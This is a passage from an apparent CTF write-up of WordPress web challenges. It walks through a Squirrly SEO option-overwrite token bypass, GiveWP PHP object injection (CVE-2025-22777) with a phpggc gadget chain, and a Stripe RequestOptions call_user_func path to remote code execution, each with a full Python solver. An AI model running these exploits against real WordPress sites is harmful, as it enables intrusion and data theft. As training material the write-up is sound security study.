        $nope = array('users_can_register', 'auto_update_core_minor', 'auto_update_core_dev', 'upload_url_path', 'mailserver_pass', 'wp_user_roles', 'template', 'blog_public', 'html_type', 'sticky_posts', 'use_balanceTags', 'page_for_posts', 'permanent-links', 'hack_file', 'multisite', 'comment_max_links', 'mailserver_login', 'use_trackback', 'comments_per_page', 'default_pingback_flag', 'siteurl', 'enable_app', 'large_size_w', 'default_comments_page', 'default_comment_status', 'links', 'moderation_keys', 'sidebars_widgets', 'posts_per_page', 'links_updated_date_format', 'default_role', 'theme', 'advanced_edit', 'image_default_link_type', 'blogname', 'thumbnail_size_w', 'admin_email', 'enable_xmlrpc', 'rss_use_excerpt', 'require_name_email', 'comment_whitelist', 'medium_large_size_h', 'show_comments_cookies_opt_in', 'comment_order', 'use_balancetags', 'close_comments_for_old_posts', 'gzipcompression', 'use_smilies', 'upload_path', 'moderation_notify', 'close_comments_days_old', 'medium_size_w', 'show_on_front', 'reading', 'show_avatars', 'default_post_format', 'site_icon', 'comments_notify', 'adminhash', 'gmt_offset', 'rewrite_rules', 'rss_language', 'thread_comments_depth', 'permalink_structure', 'default_category', 'links_recently_updated_append', 'thread_comments', 'home', 'widget_categories', 'use_linksupdate', 'default_post_edit_rows', 'comment_moderation', 'start_of_week', 'wp_page_for_privacy_policy', 'date_format', 'widget_text', 'active_plugins', 'avatar_default', 'timezone_string', 'auto_update_core_major', 'default_ping_status', 'tag_base', 'media', 'widget_rss', 'general', 'time_format', 'large_size_h', 'others', 'embed_size_w', 'posts_per_rss', 'image_default_size', 'mailserver_url', 'fileupload_maxk', 'page_comments', 'links_recently_updated_time', 'thumbnail_size_h', 'page_on_front', 'uploads_use_yearmonth_folders', 'ping_sites', 'comment_registration', 'thumbnail_crop', 'medium_large_size_w', 'recently_edited', 'image_default_align', 'avatar_rating', 'links_recently_updated_prepend', 'new_admin_email', 'comments', 'embed_size_h', 'default_email_category', 'embed_autourls', 'stylesheet', 'blacklist_keys', 'https_detection_errors', 'medium_size_h', 'category_base', 'blogdescription', 'avatars', 'mailserver_port', 'default_link_category', 'secret', 'writing', 'blog_charset');

        if(!in_array($option_name, $nope)){
            update_option($option_name, wp_json_encode($_POST["option_value"]));
        }

        echo "option updated";
    }
    ```

Our input will be JSON-encoded using `wp_json_encode`, meaning the options we can update will also be JSON-encoded. Let's check what we can modify in the database.

```php
sudo docker compose exec wp_service_1_db mysql -u root -pREDACTED
mysql> use wordpress;
mysql> select * from wp_options;
```

Using these commands, we get the following output:

![](./imgs/image_T27aVmlW.png)

These options are stored in JSON format, making them compatible with the encoding used in `test-plugin.php`.

Additionally for second vulnerability, we can see that several routes are registered in the **Squirrly SEO** plugin:

![](./imgs/image_Oew81giU.png)

One of these routes can be used to read posts containing the flag. Check the get route:

```php
			register_rest_route( $this->namespace, '/get/', array(
					'methods'             => WP_REST_Server::READABLE,
					'callback'            => array( $this, 'getData' ),
					'permission_callback' => '__return_true'
				) );
```

getData method

    ```php
    /**
    	 * Get data for the Focus Page Audit
    	 *
    	 * @param WP_REST_Request $request
    	 */
    	public function getData( WP_REST_Request $request ) {

    		global $wpdb;
    		$response = array();
    		SQ_Classes_Helpers_Tools::setHeader( 'json' );

    		//get the token from API
    		$token = $request->get_param( 'token' );
    		if ( $token <> '' ) {
    			$token = sanitize_text_field( $token );
    		}

    		if ( ! $this->token || $this->token <> $token ) {
    			exit( wp_json_encode( array( 'error' => esc_html__( "Connection expired. Please try again.", 'squirrly-seo' ) ) ) );
    		}

    		$select = $request->get_param( 'select' );

    		switch ( $select ) {
    			case 'innerlinks':

    				$inner_links = array();
    				$url         = esc_url_raw( $request->get_param( 'url' ) );
    				$start       = (int) $request->get_param( 'start' );
    				$limit       = (int) $request->get_param( 'limit' );

    				if ( $url == '' ) {
    					exit( wp_json_encode( array( 'error' => esc_html__( "Wrong Params", 'squirrly-seo' ) ) ) );
    				}

    				//define vars
    				if ( $limit == 0 ) {
    					$limit = 1000;
    				}

    				//prepare the url for query
    				$url_backslash = str_replace( '/', '\/', str_replace( rtrim( home_url(), '/' ), '', $url ) );
    				$url_encoded   = urlencode( str_replace( trim( home_url(), '/' ), '', $url ) );
    				$url_decoded   = str_replace( trim( home_url(), '/' ), '', urldecode( $url ) );

    				//get post inner links
    				$select_table = $wpdb->prepare( "SELECT ID FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit );
    				if ( $ids = $wpdb->get_col( $select_table ) ) {
    					$query = $wpdb->prepare( "SELECT `ID` FROM `$wpdb->posts` as p WHERE ID in (" . join( ',', array_values( $ids ) ) . ") AND (p.post_content LIKE %s OR p.post_content LIKE %s OR p.post_content LIKE %s OR p.post_content LIKE %s)", '%' . $url . '%', '%' . $url_backslash . '%', '%' . $url_encoded . '%', '%' . $url_decoded . '%' );

    					if ( ! $inner_links = wp_cache_get( md5( $query ) ) ) {
    						//prepare the inner_links array
    						$inner_links = array();

    						if ( $rows = $wpdb->get_results( $query ) ) {
    							if ( ! empty( $rows ) ) {
    								foreach ( $rows as $row ) {
    									if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
    										$inner_links[] = get_permalink( $row->ID );
    									}
    								}
    							}
    						}

    					}

    					wp_cache_set( md5( $query ), $inner_links, '', 3600 );
    				}

    				$response = array( 'url' => $url, 'inner_links' => $inner_links );
    				break;

    			case 'keyword':

    				$url     = esc_url_raw( $request->get_param( 'url' ) );
    				$keyword = sanitize_text_field( $request->get_param( 'keyword' ) );
    				$start   = (int) $request->get_param( 'start' );
    				$limit   = (int) $request->get_param( 'limit' );

    				if ( $url == '' || $keyword == '' ) {
    					exit( wp_json_encode( array( 'error' => esc_html__( "Wrong Params", 'squirrly-seo' ) ) ) );
    				}

    				//define vars
    				if ( $limit == 0 ) {
    					$limit = 1000;
    				}
    				$regex = "\\b" . strtolower( $keyword ) . "\\b";

    				//get post keywords found
    				$select_table = $wpdb->prepare( "SELECT ID FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit );
    				if ( $ids = $wpdb->get_col( $select_table ) ) {
    					$query = $wpdb->prepare( "SELECT `ID`, `post_content` FROM `$wpdb->posts` as p WHERE ID in (" . join( ',', array_values( $ids ) ) . ") AND (LOWER(p.post_content) REGEXP %s)", $regex );

    					if ( ! $urls = wp_cache_get( md5( $query ) ) ) {
    						//prepare the url for query
    						$urls = array();

    						if ( $rows = $wpdb->get_results( $query ) ) {
    							if ( ! empty( $rows ) ) {
    								foreach ( $rows as $row ) {
    									if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
    										$row->content = str_replace( '\/', '/', $row->content );

    										$urls[] = array(
    											'post_id'   => $row->ID,
    											'permalink' => get_permalink( $row->ID ),
    											'innerlink' => strpos( $row->content, untrailingslashit($url) ) !== false
    										);
    									}
    								}
    							}
    						}

    						wp_cache_set( md5( $query ), $urls, '', 3600 );
    					}

    					$response = array( 'keyword' => $keyword, 'urls' => $urls );
    				}else{

    					$response = array( 'keyword' => '', 'urls' => array() );
    				}

    				break;
    			case 'posts':
    				//get post inner links
    				$total_posts = 0;

    				if ( $row = $wpdb->get_row( $wpdb->prepare( "SELECT COUNT(`ID`) as count FROM `$wpdb->posts` WHERE `post_status` = %s", 'publish' ) ) ) {
    					$total_posts = $row->count;
    				}

    				$response = array( 'total_posts' => $total_posts );
    				break;

    			case 'post':

    				$id = (int) $request->get_param( 'id' );

    				if ( $id == 0 ) {
    					wp_send_json_error( esc_html__( "Wrong Params", 'squirrly-seo' ) );
    				}

    				//get Squirrly SEO post metas
    				if ( $post = SQ_Classes_ObjController::getClass( 'SQ_Models_Snippet' )->setPostByID( $id ) ) {
    					$response = $post->toArray();
    				}

    				break;

    			case 'squirrly':

    				//Get Squirrly settings
    				if ( $options = SQ_Classes_Helpers_Tools::getOptions() ) {
    					$response = (array) $options;
    				}

    				break;
    		}

    		echo wp_json_encode( $response );

    		exit();

    	}
    ```

To activate this route, we need to enable several options stated here.

```php
	public function hookInit() {

		if ( SQ_Classes_Helpers_Tools::getOption( 'sq_api' ) == '' ) {
			return;
		}

		if ( ! SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_connect' ) ) {
			return;
		}

		$this->token = SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_token' );

		//Change the rest api if needed
		add_action( 'rest_api_init', array( $this, 'sqApiInit' ) );
	}

```

First, one is `sq_qpi`, the second is `sq_cloud_connect`, and the last is `sq_cloud_token` to bypass the token verification part.

Lastly, you just need to access that REST and specify `token` with your updated token via the `update_option`, `select` with the value `post`, and `id` with the ID of the post you want to read.

## Solver

```python
import httpx
import asyncio

URL = "http://52.77.81.199:9177/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def update_option(self) -> None:
        return await self.c.post("/wp-admin/admin-ajax.php?action=uptoyou", data={
            "option_name": "sq_options",
            "option_value[sq_cloud_token]": "dimas123",
            "option_value[sq_api]": "dimas123",
            "option_value[sq_cloud_connect]": "dimas123",
        })
    def get_flag(self):
        return self.c.get("/wp-json/squirrly/get?token=dimas123&select=post&id=5")

async def main():
    api = API()
    res = await api.update_option()    
    res = await api.get_flag()    
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())

```

### Flag

![](./imgs/image_wjb34FXP.png)

# **Give**

| Solves | 3 |
| ------ | - |

Description

    Who give me ?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/da961bec-d193-484a-8f40-dd16f9e1abb2/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46646T6HJUL%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044428Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIQCJfKvGEsxDRHVvuIsYcVKjVaw1MIHRKx3hj6POMAKusAIgcXHMzoJjM0YdM%2BQ2WEJGv4VBJnVT%2Bek%2F%2FY98%2BkWzcmsqiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDAxUbg6ujc2ZjHv9%2FCrcA36GcqNIgr6SVEf7ZAQK%2BIUCJp6bI2UfcKyFV5HIWnGj8rCX4GiNLrmzXy8GoW1ztRA00dWkejrm6DeXaI0g6Gp7BWDtbov4wT6Ck1dbEO%2BuV7NfgDkkPtAoUx4XBkEO0cZcTTTfy68lh6E%2FEy%2BKrNdO2DszsOQrvQAnkU8SMyeHTuJ6z0XNA%2F4ra4YKIVN9A70M%2Fg4aIrUjnKWmxKP3RLR%2B9gfWCNZ2Ud6ZQ%2BDCiI4cPWs6P19veIrebwSEHxbVkMiC281wCMO3AH0WPb4QGDszPd1%2B9WPieJH1dHg6U%2B%2Bttr2Di2W2zm6VJTKV63bzTn0ZlalSppR1i2gffzfclAdvA08G%2FKWcZA7A43RX%2B5Cc9wRXHJWq3f43OagsqdMrRxXNOYwPwotSLUmWM3BBFZ2I14AH0Cm234kUh6JsE0nR7FiupnK%2B9p6M53SqzaGG90EN%2FS3yy9EFyYnNLSBL3pgKTvBqLrYCM2ku1NseHdqXFS%2F4WmAqub7DsxqAUSERsXlVF15skI18Pb91%2Blf3dAw18zVHVEmyEYh8tGnjyd0EnnyeNgGy0DJUWQ7GxMLo46H8iVoQOG6gSWv1TSqdz%2B7Io03VMVnmBwm6S90PvQ8Aqigv3%2FHra5OryGx5MOWSxcEGOqUBSVYSu1Fj%2FKU22WhbdpNWNy08io76xNgl66IJRiR2Bws1p9MQWoX4zvOj802LNfIiS1csDJD9Nn1TsWa1NnrjaaSNYOliKGII5%2Fnp9%2BUtChvVXzYEtAVWTr3anZB1R4%2BAVaBhoA6h9CY8ZaZuIJznoMGpSREb87SV5FU0RtRs5C64WDQh64lb%2F0t7E2eNZZRJtFpksl2kLn1whp9zOcvK9ssVQBaG&X-Amz-Signature=fc16af04fb596e24e373c1eece45e109a57a413f05d6197d12017809907d7ea9&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [Critical Vulnerability Patched in GiveWP Plugin - Patchstack](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/)

    - [Rollbar Plugin - PHP Object Injection Gadget:](https://www.notion.so/10848583e65d8026a1cbeb7d36f38336#d2f2d20e16e14429af47786aa6023db8) 

***

In this challenge, we need to exploit a known vulnerability in GiveWP **CVE-2025-22777.** This CVE is related to PHP Object Injection, and a partial POC is published in this article: [Critical Vulnerability Patched in GiveWP Plugin - Patchstack](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/).

To exploit this vulnerability, you need just two things: one is the GiveWP form, and the second is the PHP POP Gadget. For the PHP POP Gadget, since the challenge has Rollbar installed, which is known to have a PHP POP Chain due to its dependency from a previous CTF here [Rollbar Plugin - PHP Object Injection Gadget:](https://www.notion.so/10848583e65d8026a1cbeb7d36f38336#d2f2d20e16e14429af47786aa6023db8) , you can use this as a gadget to exploit the PHP POP Chain. You can see more details on how to exploit this in the solver below.

## Solver

```python
import httpx
import asyncio
import re
import subprocess
URL = "http://52.77.81.199:9140/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

    def wp_login(self, username: str, password: str) -> None:
        return self.c.post("/wp-login.php", data={
            "log": username,
            "pwd": password
        })
    

class API(BaseAPI):
    async def donate(self, url) -> None:
        data = {
            "amount": "10",
            "currency": "USD",
            "donationType": "single",
            "formId": "9",
            "email": "admin@getmoreplugins.com",
            "gatewayId": "manual",
            "firstName": "a",
            "lastName": "a",
            "comment": subprocess.check_output("./phpggc/phpggc Monolog/RCE7 system 'cat /*'", shell=True).replace(b"a:", b"a%F0%9F%98%BC:").replace(b"O:", b"O%F0%9F%98%BC:").replace(b"s:", b"s%F0%9F%98%BC:").replace(b"i:",b"i%F0%9F%98%BC:").strip(),
            "company": "",
            "donationBirthday": "",
            "originUrl": "http://localhost:9140/donations/",
            "isEmbed": "true",
            "embedId": "9",
            "gatewayData[testGatewayIntent]": "test-gateway-intent"
        }
        
        # URL-encode the data
        return await self.c.post(url, files={"a":("a","b")}, data=data)  # Send the URL-encoded data with headers
    async def get_givewp_post_url(self):
        res = await self.c.get("/?givewp-route=donation-form-view&form-id=9")
        url = re.findall('"donateUrl":"(.*?)"',res.text)[0].replace("\\/", "/")
        return url   

async def main():
    api = API()

    # Get the signature and expiration
    url = await api.get_givewp_post_url()

    # Example usage of the donate method
    donation_response = await api.donate(url)
    print(donation_response.text)

if __name__ == "__main__":
    asyncio.run(main())

```

### Flag

![](./imgs/image_RSxstIc5.png)

# **Unicorn**

| Solves | 2 |
| ------ | - |

Description

    Now I am a Unicorn.

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8c26dec7-858d-452f-900c-dd8bc484d2ca/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466V737DEBD%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIQDv6MyAgod9QVpHdpKcloTWd516uUk7XPf3dSwJCCYGWAIgYtqs53Eq%2BJ3a9c3KDSmgN0EHt5dcQRcWz%2FUS4pLV38oqiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDmCbQwdiS8BYAa93CrcA9f95UVwKCtlSggSJ1QsPwhyj61BOJqcY4MagU1cOriTwqqydCtrT8QgyTyWJDgnvrl%2BA%2F7jA4uHLjO7vspsMAT359ThhV1ELmIc8W4PNdgRAAsARkaWYy%2FS7EUjzN987kIKpJaQiqSdL80%2FHx26IJPWRuFEY0159WrimT2Bc9Bu6TDyBrqr3zjtXPhz16O3Sw9hHXd726Ne2ccESFzcNFXjWtykxXejVNKtJbzoQhK74ykdWI75hnAhpDpFhIhU8WRKlpD%2FF0HfgJSRU2tpQn2hB8Qn7YHPAPANsM0DPtOzZskwnUpOOYJs%2F%2BGprCWHHVKyRL7b%2BJOC5RPc8zn%2F4F9fvJDVfLPY%2FAuzML3n9xpWnCwf7NBfuq4wl%2BoagBEDaFXd8Oe0q286HGDKbhteOMXH%2B2nH9TyxgmdNgL8SCeH2kG5X7hfET6a%2FjwppAIWVVoRvKlOEXxgp1%2BoiZAGofiBTIjyN3FT5H%2FxOOw6NBwSd5uw2E%2FCT%2FHnp%2B0zUMcV99UZt2cK6ixJ%2Byx9Z5YwXasn6izZRkxL%2BkGIRMl7xfjD81RBBq2SPEiWAfCU396GMDNiA87MkzPKJlhAWtoKc024H6TOKyxTB8Ft86R3jGMS%2F7Mf7blPeuoOyzQNmMMmSxcEGOqUBigAZlJnmsKLoThLEi8thK3NPCFlqPg%2BWKdsyTzDKwYnvHErBd41OHoAKy%2FYtdBHL1t4V4slKpKOeTSG6R4Tq4DwhYYgTClmKYXJIiujchjKFe1z2MRBR0IJ7H8%2BqxNtlvA4GZV1kH5h87pgrVVBXd4Y%2BMGCpXWkU0XC4igOr1rgcWH0UQVzw10MGqJpPkZCBYPSrvyuEWOY%2FPNZ6M8W%2B7R2pWqgp&X-Amz-Signature=d9c648d2740b79bbc2cf82c8ccb4d5794f3a190b8f7d03e8a6a7b9c9f0edd151&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we have the power to call an arbitrary method from allowed namespaces, but the restriction is that we can control only one argument, and the argument is an array. So, we need a method that both accepts an array and requires only one argument while also being in the whitelisted namespaces. Here is the server that handles the method calling:

server-given/challenge-custom/unicorn/includes/class-main.php

    ```php
    add_action('wp_ajax_nopriv_handle_ajax', 'handle_ajax');

    function handle_ajax() {
        $whitelisted_namespaces = [
            '\\Unicorn\\',
            '\\Stripe\\ApiOperations',
            '\\Stripe\\Apps',
            '\\Stripe\\Billing', 
            '\\Stripe\\Climate',
            '\\Stripe\\Entitlements',
            '\\Stripe\\Events',
            '\\Stripe\\Exception',
            '\\Stripe\\Exception\\OAuth',
            '\\Stripe\\FinancialConnections',
            '\\Stripe\\HttpClient',
            '\\Stripe\\Issuing',
            '\\Stripe\\Service',
            '\\Stripe\\Treasury',
            '\\PaypalServerSdkLib\\Controllers',
            '\\PaypalServerSdkLib\\Models',
            '\\Psr\\EventDispatcher',
            '\\Symfony\\Component',
            '\\Give\\Vendors',
            '\\Action_Scheduler\\Migration'
        ];

        if (!isset($_REQUEST['token']) || false === check_ajax_referer('ajax_submit_unicorn', 'token', false)) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid token', 'real-time-auto-find-and-replace'),
                'text'   => __('Sorry! we are unable recognize your auth!', 'real-time-auto-find-and-replace'),
            ));
        }

        if (!isset($_REQUEST['data']) && isset($_POST['method'])) {
            $data = $_POST;
        } else {
            $data = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';
        }

        // Get methods
        $method = isset($data['method']) ? $data['method'] : (isset($_REQUEST['method']) ? $_REQUEST['method'] : '');

        if (empty($method) || strpos($method, '@') === false) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Request', 'real-time-auto-find-and-replace'),
                'text'   => __('Method parameter missing / invalid!', 'real-time-auto-find-and-replace'),
            ));
        }

        $method = explode('@', $method);
        $class_path = \str_replace('\\\\', '\\', $method[0]);
        // $class_path = \str_replace('\\\\', '\\', '\\Unicorn\\' . $method[0]);

        $is_whitelisted = false;
        foreach ($whitelisted_namespaces as $namespace) {
            if (strpos($class_path, $namespace) === 0) {
                $is_whitelisted = true;
                break;
            }
        }

        if (!$is_whitelisted) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Namespace', 'real-time-auto-find-and-replace'),
                'text'   => __('The requested namespace is not allowed.', 'real-time-auto-find-and-replace'),
            ));
        }

        if (!class_exists($class_path)) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Library', 'real-time-auto-find-and-replace'),
                'text'   => sprintf(__('Library Class "%s" not found! ', 'real-time-auto-find-and-replace'), $class_path),
            ));
        }

        if (!method_exists($class_path, $method[1])) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Method', 'real-time-auto-find-and-replace'),
                'text'   => sprintf(__('Method "%1$s" not found in Class "%2$s"! ', 'real-time-auto-find-and-replace'), $method[1], $class_path),
            ));
        }

        (new $class_path())->{$method[1]}($data);
        exit;
    }
    ```

After searching with regex, I found something interesting in the `parse` method of the `RequestOptions` class here:

server-given/challenge-custom/unicorn/vendor/stripe/stripe-php/lib/Util/RequestOptions.php

    ```php
    <?php

    namespace Stripe\Util;

    /**
     * @phpstan-type RequestOptionsArray array{api_key?: string, idempotency_key?: string, stripe_account?: string, stripe_context?: string, stripe_version?: string, api_base?: string }
     * @psalm-type RequestOptionsArray = array{api_key?: string, idempotency_key?: string, stripe_account?: string, stripe_context?: string, stripe_version?: string, api_base?: string }
     */
    class RequestOptions
    {
        ...snip...
        /**
         * Unpacks an options array into an RequestOptions object.
         *
         * @param null|array|RequestOptions|string $options a key => value array
         * @param bool $strict when true, forbid string form and arbitrary keys in array form
         *
         * @throws \Stripe\Exception\InvalidArgumentException
         *
         * @return RequestOptions
         */
        public static function parse($options, $strict = false)
        {
            if ($options instanceof self) {
                return clone $options;
            }

            if (null === $options) {
                return new RequestOptions(null, [], null);
            }

            if (\is_string($options)) {
                if ($strict) {
                    $message = 'Do not pass a string for request options. If you want to set the '
                        . 'API key, pass an array like ["api_key" => <apiKey>] instead.';

                    throw new \Stripe\Exception\InvalidArgumentException($message);
                }

                return new RequestOptions($options, [], null);
            }

            if (\is_array($options)) {
                $headers = [];
                $key = null;
                $base = null;

                if (\array_key_exists('api_key', $options)) {
                    $key = $options['api_key'];
                    unset($options['api_key']);
                }
                if (\array_key_exists('idempotency_key', $options)) {
                    $headers['Idempotency-Key'] = $options['idempotency_key'];
                    unset($options['idempotency_key']);
                }
                if (\array_key_exists('stripe_account', $options)) {
                    if (null !== $options['stripe_account']) {
                        unset($options['action']);
                    }   
                }
                if (\array_key_exists('stripe_context', $options)) {
                    if (null !== $options['stripe_context']) {
                        $headers['Stripe-Context'] = $options['stripe_context'];
                    }
                    unset($options['stripe_context']);
                }
                if (\array_key_exists('stripe_version', $options)) {
                    if (null == $options['action']) {
                        $headers['Stripe-Version'] = $options['stripe_version'];
                        $base = $options['api_base'];
                        $version = $options['stripe_version'];
                        call_user_func($base, $version);
                    }
                    unset($options['stripe_version']);
                }
                if (\array_key_exists('api_base', $options)) {
                    $base = $options['api_base'];
                    unset($options['api_base']);
                }

                if ($strict && !empty($options)) {
                    $message = 'Got unexpected keys in options array: ' . \implode(', ', \array_keys($options));

                    throw new \Stripe\Exception\InvalidArgumentException($message);
                }

                return new RequestOptions($key, $headers, $base);
            }

            $message = 'The second argument to Stripe API method calls is an '
                . 'optional per-request apiKey, which must be a string, or '
                . 'per-request options, which must be an array. (HINT: you can set '
                . 'a global apiKey by "Stripe::setApiKey(<apiKey>)")';

            throw new \Stripe\Exception\InvalidArgumentException($message);
        }
        ...snip...
    }

    ```

You will see that the method accepts an array as an argument, and eventually, our array will reach `call_user_func`, which means we can gain RCE using it. But wait, it's not in the whitelisted namespace. So, we need to find another method in the whitelisted namespace that will call the `parse` method. That's when I stumbled upon this class.

server-given/challenge-custom/unicorn/vendor/stripe/stripe-php/lib/Billing/CreditBalanceTransaction.php

    ```php
    <?php

    // File generated from our OpenAPI spec

    namespace Stripe\Billing;

    /**
     * A credit balance transaction is a resource representing a transaction (either a credit or a debit) against an existing credit grant.
     *
     * @property string $id Unique identifier for the object.
     * @property string $object String representing the object's type. Objects of the same type share the same value.
     * @property int $created Time at which the object was created. Measured in seconds since the Unix epoch.
     * @property null|\Stripe\StripeObject $credit Credit details for this credit balance transaction. Only present if type is <code>credit</code>.
     * @property string|\Stripe\Billing\CreditGrant $credit_grant The credit grant associated with this credit balance transaction.
     * @property null|\Stripe\StripeObject $debit Debit details for this credit balance transaction. Only present if type is <code>debit</code>.
     * @property int $effective_at The effective time of this credit balance transaction.
     * @property bool $livemode Has the value <code>true</code> if the object exists in live mode or the value <code>false</code> if the object exists in test mode.
     * @property null|string|\Stripe\TestHelpers\TestClock $test_clock ID of the test clock this credit balance transaction belongs to.
     * @property null|string $type The type of credit balance transaction (credit or debit).
     */
    class CreditBalanceTransaction extends \Stripe\ApiResource
    {
        ...snip...
        public static function retrieve($opts, $id = null)
        {
            $opts = \Stripe\Util\RequestOptions::parse($opts);
            $instance = new static($id, $opts);
            $instance->refresh();

            return $instance;
        }
    }

    ```

This class will call the `parse` method and requires only one argument, which means we can use it to gain access to `call_user_func`. Then, you just need to add this class method into `handle_ajax` and provide the required argument to reach `call_user_func` in the `parse` method, just like in the solver below.

## Solver

```python
import httpx
import asyncio
import re

URL = "http://52.77.81.199:9143/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    async def handle_ajax(self, token):
        return await self.c.post("/wp-admin/admin-ajax.php?action=handle_ajax", data={
            "token": token,
            "data[method]": r"\Stripe\Billing\CreditBalanceTransaction@retrieve", 
            "data[stripe_version]": r"1", 
            "data[api_base]": r"system", 
            "data[stripe_version]": r"cat /*", 
        })


class API(BaseAPI):
    async def get_nonce(self):
        res = await self.c.get("/wp-admin/admin-ajax.php?action=foo")
        return re.findall("var ajaxNonce = '(.*?)'", res.text)[0]

async def main():
    api = API()
    nonce = await api.get_nonce()
    res = await api.handle_ajax(nonce)
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
```

### Flag

![](./imgs/image_V1OBnIfh.png)

# **Woops**

| Solves | 2 |
| ------ | - |

Description

    woops, woops, woops, you found it.

    - ) there is a plugin code that are not included on the given attachment, you can just get it from "some" source

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/1644be82-fb9b-467b-85d8-a23458c92d24/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662OUCQNXF%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044433Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIEDej7fdmBF6a3bzDblOdwD3wINSZv%2BsfMFYIHTOJKf0AiEAvsgH9A%2F2Oteihol0IV6pYcbmPPHEcHumZQPxC%2FADsrQqiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLQezHSHUd3I7w1spCrcA9ZY7dFyOKDFOjb9hsWn3Zh2x1AMxGzbs6L19bNuLPk4n3e7jXgmx%2B3UIglFC0Up4CfdqFfYjX4VuGN7fdOCXJVc542j0ltTatBKTxMZVtOraHS8hj73r6hI%2B4NloMRXfYpFmdPivcyGS0XnR1LzfdK0fk99SMBzR8n9yUMQA0L2PoOIhyBeUlHAdGYA3kwA8oK18kotx3M4rD6bYr29eTEJLGbvac9RG5JDcspo2O3hgW1JqkfYUXMSDkFdMef0HK81tQ8jx2WPvyGfRlAhptlye5hQgi0630Kz3AesFZMQWwcEkw9PlGUiBdHCZvezfDU73gDKHx678H8BDbyIuoLz7KptqReSdB%2BtpUWsbq6nxkClvIBOGXQqONibR34iFb50vVubpp6fzNj%2B2kowvUqDZuH09GDe6fjs0Pef0hB4qU2KWBF%2BY45%2BxV1HEgwRMwx6Ug6jLClWvt8yAX3wDQEixWf2VlhukSucXiaei1ugVk9S6Wa%2B6QVs2EapjHc2XHTaZvhnkFQfDsP07OeByHs86emQIVFZ48066pyHvnwva7IE3V2B5fl0C5WWdZ43B0OCGZQvqMfB9VT6Q%2FNB0CXxwDB%2FDcACdzAWpFo1b2IwC3zj6NjCvdOSXeYyMKKSxcEGOqUBXoNZIRsRkgrWilbxNU4AGPPgBm6CuP2CMn0LRQH7Z1Iu8K3rKANNR5wtv5PT7Kt6Z%2BurlGMQAS8AYBNmQ1veOR5VPRbQudGM39tn%2Boe%2FzHlY%2BiznqForjsUUw%2Bc721YxMLxVipdR4Wqe0DnEQjkUUIDoXj7Dk%2BKLVGvECls76Vs0RF3c9YrcpAAR0YJbhzNZa7otWiiv2lyd47OJhQ%2FrA%2B3TW4B5&X-Amz-Signature=d0b9ec9db3e3658640f168b10276b72b9ec49313eeaf539083e7b9b559bb439d&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we first need to get the missing plugin. We can read the common file name in a WordPress plugin, such as `changelog.txt`, as an example here:

![](./imgs/image_NBywg0PL.png)

We see that the `js_composer` plugin is using version 7.4 and, interestingly, is referenced in the Patchstack database here: [WPBakery Page Builder Vulnerabilities - Patchstack](https://patchstack.com/database/wordpress/plugin/js_composer/). The plugin should be vulnerable to Local File Inclusion. See the image below:

![](./imgs/image_yUbNWnb0.png)

